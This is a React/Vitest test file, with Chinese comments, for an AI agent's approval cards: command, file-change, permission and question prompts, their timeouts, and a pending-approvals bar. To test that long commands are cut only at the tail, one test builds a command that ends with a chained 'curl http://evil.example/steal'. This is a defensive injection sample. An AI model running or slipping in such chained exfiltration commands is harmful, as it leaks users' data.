/**
 * 审批 UX（10 §3）。
 *
 * 这一组测试盯的都是**做错了代价很高**的地方：
 * 「为什么需要确认」缺失时不能留空、命令超长不能中间省略、
 * 批量变更不给"本次任务内都允许"、Cancel 与 Decline 分开、
 * 无人值守要说清 10 分钟后自动取消。
 */
import { fireEvent, render, screen } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';

import {
  ApprovalCard,
  PendingApprovalBar,
  type ApprovalViewModel,
} from '../src/renderer/components/approval-card.js';

function approval(over: Partial<ApprovalViewModel> = {}): ApprovalViewModel {
  return {
    id: 'apv_1',
    kind: 'command',
    threadId: 't1',
    reason: '这个命令会从网络安装软件包',
    command: 'pip install openpyxl',
    cwd: '~/work/weekly',
    allowAcceptForSession: true,
    ...over,
  };
}

describe('命令审批卡（10 §3.2）', () => {
  it('显示命令、cwd 与**为什么需要确认**', () => {
    render(<ApprovalCard approval={approval()} onDecide={() => {}} />);
    expect(screen.getByText(/pip install openpyxl/)).toBeTruthy();
    expect(screen.getByText(/在 ~\/work\/weekly/)).toBeTruthy();
    expect(screen.getByText(/为什么需要确认：这个命令会从网络安装软件包/)).toBeTruthy();
  });

  it('**理由缺失时显式说明缺失**，而不是留空（没有理由的审批等于让用户瞎点）', () => {
    // 刻意构造一个没有 reason 的审批：exactOptionalPropertyTypes 下要用删除而不是传 undefined
    const withoutReason = { ...approval() } as Record<string, unknown>;
    delete withoutReason.reason;
    render(
      <ApprovalCard approval={withoutReason as unknown as ApprovalViewModel} onDecide={() => {}} />,
    );
    const text = screen.getByText(/为什么需要确认/).textContent ?? '';
    expect(text).toContain('没有给出理由');
    // 而且要给出建议，不只是说"没有"
    expect(text).toContain('建议先拒绝');
  });

  it('命令超长时**只截尾部，绝不省略中间**（中间省略号是注入的最佳藏身处）', () => {
    const long = `python3 -c "${'x'.repeat(300)}" && curl http://evil.example/steal`;
    render(<ApprovalCard approval={approval({ command: long })} onDecide={() => {}} />);

    const shown = screen.getByText(/python3 -c/).textContent ?? '';
    // 尾部被截掉（所以看不到最后那段 curl），而不是中间打省略号
    expect(shown).not.toContain('curl http://evil.example');
    expect(shown.endsWith('…')).toBe(true);
    expect(shown).not.toMatch(/….+$/); // 省略号之后不该还有内容

    // 展开后能看到完整命令
    fireEvent.click(screen.getByRole('button', { name: '查看完整命令' }));
    expect(screen.getByText(/python3 -c/).textContent ?? '').toContain('curl http://evil.example');
  });

  it('四个动作齐全，且 **Cancel 与 Decline 分开**（10 §3.1）', () => {
    const onDecide = vi.fn();
    render(<ApprovalCard approval={approval()} onDecide={onDecide} />);

    fireEvent.click(screen.getByRole('button', { name: '允许这一次' }));
    fireEvent.click(screen.getByRole('button', { name: '本次任务内都允许' }));
    fireEvent.click(screen.getByRole('button', { name: '拒绝' }));
    fireEvent.click(screen.getByRole('button', { name: '结束这个动作' }));

    expect(onDecide.mock.calls.map((c) => c[0])).toEqual([
      'accept',
      'acceptForSession',
      'decline',
      'cancel',
    ]);
  });

  it('无障碍：role=alertdialog（10 §8.1）', () => {
    render(<ApprovalCard approval={approval()} onDecide={() => {}} />);
    expect(screen.getByRole('alertdialog', { name: '需要你确认' })).toBeTruthy();
  });
});

describe('文件变更审批卡（10 §3.3）', () => {
  it('**工作空间外的文件排在最前**并标注', () => {
    render(
      <ApprovalCard
        approval={approval({
          kind: 'fileChange',
          changes: [
            { path: '/w/report.docx', kind: 'add' },
            { path: '/etc/config.json', kind: 'modify', outsideWorkspace: true },
          ],
          allowAcceptForSession: false,
        })}
        onDecide={() => {}}
      />,
    );
    const items = [...document.querySelectorAll('.ew-approval-changes li')];
    expect(items[0]?.textContent).toContain('/etc/config.json');
    expect(items[0]?.getAttribute('data-outside')).toBe('true');
    expect(items[0]?.textContent).toContain('工作空间之外');
  });

  it('删除操作单独着色并标注（10 §3.3：删除不折叠、单独着色）', () => {
    render(
      <ApprovalCard
        approval={approval({
          kind: 'fileChange',
          changes: [{ path: '/w/old.csv', kind: 'delete' }],
          allowAcceptForSession: false,
        })}
        onDecide={() => {}}
      />,
    );
    expect(screen.getByText('删除')).toBeTruthy();
    expect(document.querySelector('.ew-approval-card')?.getAttribute('data-tone')).toBe('danger');
  });

  it('**批量变更不提供「本次任务内都允许」**（由适配层判定，前端只服从）', () => {
    render(
      <ApprovalCard
        approval={approval({
          kind: 'fileChange',
          changes: [{ path: '/w/a.txt' }, { path: '/w/b.txt' }],
          allowAcceptForSession: false,
        })}
        onDecide={() => {}}
      />,
    );
    expect(screen.queryByRole('button', { name: '本次任务内都允许' })).toBeNull();
    // 但"允许这一次"仍然要有 —— 拒绝不能是唯一出路（10 §1 原则 5）
    expect(screen.getByRole('button', { name: '允许这一次' })).toBeTruthy();
  });
});

describe('权限提升卡（10 §3.4）', () => {
  it('列出路径与网络域 + 用途，且**默认按钮是"仅本次"**（范围最小化）', () => {
    render(
      <ApprovalCard
        approval={approval({
          kind: 'permissions',
          paths: [{ path: '~/Downloads/invoices/', access: '读取' }],
          networkTargets: ['api.example.com'],
          purpose: '读取你提到的发票文件并调用汇率接口',
          allowAcceptForSession: true,
        })}
        onDecide={() => {}}
      />,
    );
    expect(screen.getByText(/~\/Downloads\/invoices\//)).toBeTruthy();
    expect(screen.getByText(/api.example.com/)).toBeTruthy();
    expect(screen.getByText(/用途：读取你提到的发票文件/)).toBeTruthy();

    // 第一个动作按钮是"允许这一次"（范围最小化，10 §3.4）
    const buttons = screen.getAllByRole('button');
    expect(buttons[0]?.textContent).toBe('允许这一次');
  });
});

describe('追问卡（10 §3.1 第四类：不是审批，是 agent 提问）', () => {
  it('有选项时点选项直接回答', () => {
    const onAnswer = vi.fn();
    render(
      <ApprovalCard
        approval={approval({
          kind: 'userInput',
          question: '用哪个季度的数据？',
          options: [
            { id: 'q2', label: '2026 Q2' },
            { id: 'q3', label: '2026 Q3' },
          ],
          allowAcceptForSession: false,
        })}
        onDecide={() => {}}
        onAnswer={onAnswer}
      />,
    );
    expect(screen.getByRole('alertdialog', { name: '需要你回答' })).toBeTruthy();
    fireEvent.click(screen.getByRole('button', { name: '2026 Q3' }));
    expect(onAnswer).toHaveBeenCalledWith({ optionId: 'q3' });
  });

  it('无选项时用自由文本回答', () => {
    const onAnswer = vi.fn();
    render(
      <ApprovalCard
        approval={approval({
          kind: 'userInput',
          question: '目标读者是谁？',
          allowAcceptForSession: false,
        })}
        onDecide={() => {}}
        onAnswer={onAnswer}
      />,
    );
    fireEvent.change(screen.getByLabelText('回答'), { target: { value: '董事会' } });
    fireEvent.click(screen.getByRole('button', { name: '回答' }));
    expect(onAnswer).toHaveBeenCalledWith({ text: '董事会' });
  });

  it('追问卡**不显示审批动作**（它不是审批）', () => {
    render(
      <ApprovalCard
        approval={approval({ kind: 'userInput', question: 'x', allowAcceptForSession: false })}
        onDecide={() => {}}
      />,
    );
    expect(screen.queryByRole('button', { name: '允许这一次' })).toBeNull();
  });
});

describe('超时与无人值守（10 §3.6）', () => {
  it('定时任务的审批卡说清 **10 分钟后自动取消**', () => {
    render(<ApprovalCard approval={approval({ unattended: true })} onDecide={() => {}} />);
    expect(screen.getByText(/无人值守 · 10 分钟后自动取消/)).toBeTruthy();
  });

  it('交互式任务等待超过 30 分钟时显示已等待时长（不自动拒绝）', () => {
    render(<ApprovalCard approval={approval({ waitedMs: 45 * 60_000 })} onDecide={() => {}} />);
    expect(screen.getByText('已等待 45 分钟')).toBeTruthy();
    expect(screen.queryByText(/自动取消/)).toBeNull();
  });
});

describe('待确认吸顶条（10 §3.5）', () => {
  it('有待审批时显示数量并可跳转', () => {
    const onJump = vi.fn();
    render(<PendingApprovalBar count={2} onJump={onJump} />);
    expect(screen.getByText('有 2 项待你确认')).toBeTruthy();
    fireEvent.click(screen.getByRole('button', { name: /跳到第一项/ }));
    expect(onJump).toHaveBeenCalled();
  });

  it('**没有"全部允许"**（10 §3.5 明确不做）', () => {
    render(<PendingApprovalBar count={5} onJump={() => {}} />);
    expect(screen.queryByText(/全部允许/)).toBeNull();
  });

  it('没有待审批时整条不渲染', () => {
    const { container } = render(<PendingApprovalBar count={0} onJump={() => {}} />);
    expect(container.firstChild).toBeNull();
  });
});
